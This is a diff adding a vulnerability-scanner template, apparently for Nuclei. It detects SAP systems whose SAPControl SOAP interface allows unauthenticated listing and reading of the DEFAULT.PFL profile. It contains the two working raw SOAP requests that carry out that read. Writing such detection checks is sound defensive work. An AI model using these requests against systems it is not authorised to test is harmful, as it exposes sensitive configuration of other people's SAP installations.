@@ -1,0 +1,65 @@
+flow: http(1) && http(2)
+http:
+- extractors:
+  - group: 1
+    internal: true
+    name: default_pfl
+    part: body
+    regex:
+    - <item>([^<]*DEFAULT\.PFL[^<]*)</item>
+    type: regex
+  matchers:
+  - condition: and
+    internal: true
+    part: body
+    type: word
+    words:
+    - ListConfigFilesResponse
+    - <configfiles>
+  raw:
+  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=UTF-8\n\
+    SOAPAction: '\"\"'\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<SOAP-ENV:Envelope\
+    \ xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <SOAP-ENV:Header>\n\
+    \    <sapsess:Session xmlns:sapsess=\"http://www.sap.com/webas/630/soap/features/session/\"\
+    >\n      <enableSession>true</enableSession>\n    </sapsess:Session>\n  </SOAP-ENV:Header>\n\
+    \  <SOAP-ENV:Body>\n    <ns1:ListConfigFiles xmlns:ns1=\"urn:SAPControl\"/>\n\
+    \  </SOAP-ENV:Body>\n</SOAP-ENV:Envelope>\n"
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - ReadConfigFileResponse
+    - <lines>
+  - status:
+    - 200
+    type: status
+  raw:
+  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=UTF-8\n\
+    SOAPAction: '\"\"'\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<SOAP-ENV:Envelope\
+    \ xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <SOAP-ENV:Header>\n\
+    \    <sapsess:Session xmlns:sapsess=\"http://www.sap.com/webas/630/soap/features/session/\"\
+    >\n      <enableSession>true</enableSession>\n    </sapsess:Session>\n  </SOAP-ENV:Header>\n\
+    \  <SOAP-ENV:Body>\n    <ns1:ReadConfigFile xmlns:ns1=\"urn:SAPControl\">\n  \
+    \    <filename>{{default_pfl}}</filename>\n    </ns1:ReadConfigFile>\n  </SOAP-ENV:Body>\n\
+    </SOAP-ENV:Envelope>\n"
+id: sap-readconfig-disclosure
+info:
+  author: LRVT,l4rm4nd
+  description: 'Detected SAP systems where the SAP Start Service (sapstartsrv) SAPControl
+    SOAP interface exposes the ReadConfigFile web method in combination with an unprotected
+    ListConfigFiles call, allowing unauthenticated reading of the global DEFAULT.PFL
+    profile.
+
+    '
+  metadata:
+    max-request: 1
+  name: SAPControl Read DEFAULT.PFL - Disclosure
+  reference:
+  - https://help.sap.com/docs/SAP_NETWEAVER_700/1098b2396c531014be229f0b7ff0e0c6/95840a509ece466ce10000000a423f68.html
+  - https://learning.sap.com/courses/technical-implementation-and-operation-i-of-sap-s-4hana-and-sap-business-suite/configuring-sap-systems-via-profile-parameters
+  - https://sapbasissolutions.wordpress.com/2013/10/08/what-are-sap-default-start-instance-profiles/
+  - https://help.sap.com/docs/SUPPORT_CONTENT/si/3362958690.html
+  - https://community.sap.com/t5/technology-blog-posts-by-members/securing-the-sap-instance-agent-sap-start-service/ba-p/13486679
+  severity: medium
+  tags: sap,sapcontrol,soap,config,disclosure
